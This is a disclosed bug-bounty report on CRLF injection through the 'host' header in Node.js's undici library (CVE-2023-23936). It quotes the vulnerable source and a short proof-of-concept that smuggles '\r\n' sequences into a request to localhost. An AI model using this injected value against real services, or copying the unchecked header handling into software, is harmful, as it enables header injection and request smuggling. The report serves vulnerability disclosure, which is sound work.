# CRLF Injection in Nodejs ‘undici’ via host

## Report Details
- **Report ID**: 1878489
- **URL**: https://hackerone.com/reports/1878489
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-02-18T14:54:34.962Z
- **Disclosed**: 2023-03-29T21:15:31.973Z

## Reporter
- **Username**: timon8
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Summary: 
undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api.
Description:
like https://hackerone.com/reports/1664019
Source code:
lib/core/request.js:296

```javascript
function processHeader (request, key, val) {
  if (val && (typeof val === 'object' && !Array.isArray(val))) {
    throw new InvalidArgumentError(`invalid ${key} header`)
  } else if (val === undefined) {
    return
  }

  if (
    request.host === null &&
    key.length === 4 &&
    key.toLowerCase() === 'host'
  ) {
    // Consumed by Client
    request.host = val // without headerCharRegex.exec(val)
  } else if (
    request.contentLength === null &&
...
```
Example:
```javascript
import { request } from 'undici'

const unsanitizedContentTypeInput =  '12 \r\n\r\naaa:aaa'

const {
    statusCode,
    headers,
    trailers,
    body
} = await request('http://127.0.0.1:23333', {
    method: 'GET',
    headers: {
        'content-type': 'application/json',
        'host': unsanitizedContentTypeInput
    }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}

console.log('trailers', trailers)

```
{F2182450}
I have submitted the report： https://hackerone.com/reports/1820955
Security Releases: https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/#fetch-api-in-node-js-did-not-protect-against-crlf-injection-in-host-headers-medium-cve-2023-23936
Security Advisory: https://github.com/nodejs/undici/security/advisories/GHSA-5r9g-qh6m-jxff

## Impact

All versions of the 19.x, 18.x and 16.x release lines.

## Attachments
- image.png
